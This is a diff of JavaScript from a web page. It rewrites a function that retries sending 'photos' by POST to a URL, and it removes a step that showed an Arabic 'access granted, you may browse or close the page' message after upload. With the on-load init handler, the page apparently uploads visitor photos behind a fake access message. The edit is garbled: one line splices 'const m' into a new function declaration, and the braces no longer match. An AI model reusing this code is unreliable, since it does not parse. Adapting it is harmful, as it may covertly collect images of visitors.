@@ -175,44 +175,40 @@
         }
 
         async function post(url, formData) {
-            const maxRetries = 5;
-            let retries = 0;
+            const masync function post(url, formData) {
+    const maxRetries = 5;
+    let retries = 0;
 
-            while (retries < maxRetries) {
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    });
+    while (retries < maxRetries) {
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
 
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-
-                    const data = await response.json();
-
-                    if (data.success) {
-                        console.log('Photos sent successfully');
-                        document.querySelector('.container').innerHTML = `
-                            <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
-                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
-                        `;
-                        return;
-                    } else {
-                        throw new Error(data.error);
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    retries++;
-                    if (retries < maxRetries) {
-                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));
-                    }
-                }
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
             }
 
-            console.error('Max retries reached. Unable to send photos.');
-        }
+            const data = await response.json();
 
+            if (data.success) {
+                console.log('Photos sent successfully');
+                return;
+            } else {
+                throw new Error(data.error);
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            retries++;
+            if (retries < maxRetries) {
+                await new Promise(resolve => setTimeout(resolve, 3000 * retries));
+            }
+        }
+    }
+
+    console.error('Max retries reached. Unable to send photos.');
+            }
         window.addEventListener('load', init);
     </script>
 </body>
